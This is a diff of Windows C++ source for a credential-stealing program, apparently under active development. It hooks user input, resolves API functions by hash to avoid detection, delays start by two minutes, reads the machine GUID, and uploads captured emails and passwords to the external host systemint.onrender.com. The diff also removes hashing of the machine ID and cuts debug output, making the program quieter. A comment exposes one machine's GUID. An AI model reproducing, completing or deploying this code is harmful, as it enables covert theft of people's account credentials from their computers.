@@ -35,41 +35,13 @@ std::string EscapeJson(const std::string& s) {
     return o.str();
 }
 
-// --- 2. SHA-256 CRYPTO ENGINE ---
-std::string Sha256(const std::string& input) {
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_HASH_HANDLE hHash = NULL;
-    DWORD cbData = 0, cbHash = 0, cbHashObject = 0;
-    PBYTE pbHashObject = NULL, pbHash = NULL;
-
-    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return "";
-    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
-    pbHashObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObject);
-    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);
-    pbHash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHash);
-    
-    if (BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0) == 0) {
-        BCryptHashData(hHash, (PBYTE)input.c_str(), (ULONG)input.length(), 0);
-        BCryptFinishHash(hHash, pbHash, cbHash, 0);
-    }
-
-    std::stringstream ss;
-    for (DWORD i = 0; i < cbHash; i++) ss << std::hex << std::setw(2) << std::setfill('0') << (int)pbHash[i];
-    
-    if (hHash) BCryptDestroyHash(hHash);
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
-    HeapFree(GetProcessHeap(), 0, pbHashObject);
-    HeapFree(GetProcessHeap(), 0, pbHash);
-    return ss.str();
-}
-
-// --- 3. SYSTEM METADATA (EXACT MATCH FOR machineIdSync(true)) ---
+// --- 2. SYSTEM METADATA (MATCHES YOUR DATABASE UUID) ---
 std::string GetMachineId() {
     char value[255];
     DWORD BufferSize = sizeof(value);
     HKEY hKey;
     
-    // Open the 64-bit Registry view to find the MachineGuid
+    // Open Registry to get MachineGuid
     LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
     
     if (lRes == ERROR_SUCCESS) {
@@ -78,14 +50,12 @@ std::string GetMachineId() {
         
         if (lRes == ERROR_SUCCESS) {
             std::string rawId = value;
-            
-            // node-machine-id converts to lowercase before hashing
+            // Ensure lowercase to match standard UUID formatting
             std::transform(rawId.begin(), rawId.end(), rawId.begin(), [](unsigned char c){ return std::tolower(c); });
             
-            // Log this so you can verify the raw string matches your regedit.exe
-            // WriteDebug("Hashing ID: " + rawId); 
-            
-            return Sha256(rawId);
+            // WE REMOVED SHA256 HERE. 
+            // This now returns the raw UUID: ef508dd1-092d-4d05-90ac-0b5338115bee
+            return rawId;
         }
     }
     return "unknown_machine_id";
@@ -113,7 +83,7 @@ void WriteDebug(std::string msg) {
     }
 }
 
-// --- 4. EXFILTRATION ---
+// --- 3. EXFILTRATION ---
 void UploadData(std::string email, std::string pass) {
     HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
     HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
@@ -143,14 +113,13 @@ void UploadData(std::string email, std::string pass) {
             DWORD statusCode = 0;
             DWORD dwSize = sizeof(statusCode);
             WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &dwSize, NULL);
-            WriteDebug("Payload Delivered. Server Status: " + std::to_string(statusCode));
-            WriteDebug("Raw JSON: " + json);
+            WriteDebug("Payload Delivered. Status: " + std::to_string(statusCode));
         }
     }
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
 }
 
-// --- 5. API STEALTH ---
+// --- 4. API STEALTH ---
 constexpr DWORD HashString(const char* str) {
     DWORD hash = 0x811c9dc5;
     while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
@@ -171,7 +140,7 @@ FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
     return NULL;
 }
 
-// --- 6. CORE LOGIC ---
+// --- 5. CORE LOGIC ---
 std::string buffer = "";
 std::string savedEmail = "";
 
@@ -231,9 +200,7 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-    WriteDebug("=== STARTING SERVICE ===");
     Sleep(120000); 
-
     HMODULE u32 = GetModuleHandleA("user32.dll");
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
     if (!_SetHook) _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
